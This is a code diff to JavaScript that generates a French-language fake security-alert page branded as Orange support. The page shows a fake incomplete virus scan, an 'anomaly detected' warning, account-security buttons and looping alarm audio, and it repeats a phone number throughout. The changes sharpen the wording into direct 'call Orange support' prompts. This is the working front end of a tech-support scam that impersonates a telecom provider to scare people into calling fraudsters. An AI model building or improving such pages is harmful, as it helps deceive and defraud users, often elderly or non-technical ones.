@@ -33,22 +33,22 @@
     '<p>L\'exécution de cette application peut mettre votre pc en danger.</p>' +
     '</section>' +
     '<div class="black-modal-blue-box">' +
-    '<p>Assistance Orange : 02 59 50 90 20</p>' +
-    '<p class="black-modal-defender">Assistance Orange</p>' +
+    '<p>Appellez l\'assistance Orange : 02 59 50 90 20</p>' +
+    '<p class="black-modal-defender">Appellez l\'assistance Orange</p>' +
     '</div>' +
-    '<section class="scan-modal" aria-label="Assistance Orange">' +
+    '<section class="scan-modal" aria-label="Appellez l\'assistance Orange">' +
     '<h2 class="scan-modal-title">Désolé, l\'analyse n\'est pas terminée !</h2>' +
-    '<p class="scan-modal-text">Assistance Orange a détecté une anomalie sur votre appareil. Contactez un expert pour une analyse complète et sécuriser votre connexion.</p>' +
+    '<p class="scan-modal-text">Une anomalie a été détectée sur votre appareil. Appellez l\'assistance Orange pour une analyse complète et sécuriser votre connexion.</p>' +
     '<p class="scan-modal-text">Contactez l\'assistance Orange pour obtenir de l\'aide</p>' +
-    '<p class="scan-modal-support">Assistance Orange : 02 59 50 90 20</p>' +
+    '<p class="scan-modal-support">Appellez l\'assistance Orange : 02 59 50 90 20</p>' +
     '<div class="scan-modal-actions">' +
     '<button class="scan-btn scan-btn-now" type="button">Analyser maintenant</button>' +
     '<button class="scan-btn scan-btn-later" type="button">Analyser plus tard</button>' +
     '</div>' +
     '</section>' +
     '</div>' +
-    '<aside class="support-card" aria-label="Assistance Orange">' +
-    '<p class="support-card-subtitle">Assistance Orange</p>' +
+    '<aside class="support-card" aria-label="Appellez l\'assistance Orange">' +
+    '<p class="support-card-subtitle">Appellez l\'assistance Orange</p>' +
     '<p class="support-card-phone">02 59 50 90 20</p>' +
     '<p class="support-card-label">Numero</p>' +
     '<div class="support-card-arrow" aria-hidden="true">▼</div></aside></div>' +
@@ -109,7 +109,7 @@
     '<div class="modal-bottom"><div class="modal-actions" role="group" aria-label="Actions">' +
     '<button class="modal-btn modal-btn-allow" id="secureAccountBtn" type="button">Sécuriser mon compte</button>' +
     '<button class="modal-btn modal-btn-deny" id="denyAccountBtn" type="button">Ce n\'est pas moi</button></div></div></div></section></main></div>' +
-    '<div class="ticker" aria-label="Bandeau defilant"><p class="ticker-text">Assistance Orange</p></div>' +
+    '<div class="ticker" aria-label="Bandeau defilant"><p class="ticker-text">Appellez l\'assistance Orange</p></div>' +
     '<audio id="securityAudio1" src="script-audio.mp3" loop preload="auto"></audio>' +
     '<audio id="securityAudio2" src="script-audio-2.mp3" loop preload="auto"></audio>' +
     '<div id="escapeExitModal" class="escape-exit-overlay" aria-hidden="true" role="dialog" aria-label="Instructions assistance">' +
